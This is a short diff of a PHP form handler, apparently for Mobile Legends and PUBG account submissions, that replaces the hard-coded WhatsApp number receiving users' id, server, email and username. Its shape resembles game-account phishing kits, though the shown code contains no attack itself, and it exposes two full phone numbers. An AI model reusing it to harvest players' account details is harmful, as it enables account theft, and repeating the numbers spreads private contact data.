@@ -1,6 +1,6 @@
 <?php
 if(isset($_POST['submitml'])){
-    $no_wa = 6281387272994;
+    $no_wa = 628119516736;
     $id = $_POST['id'];
     $server = $_POST['server'];
     $email = $_POST['email'];
@@ -19,7 +19,7 @@ if(isset($_POST['submitml'])){
 }
 
 if(isset($_POST['submitpubg'])){
-    $no_wa = 6281387272994;
+    $no_wa = 628119516736;
     $id = $_POST['id'];
     $email = $_POST['email'];
     $nick = $_POST['username'];
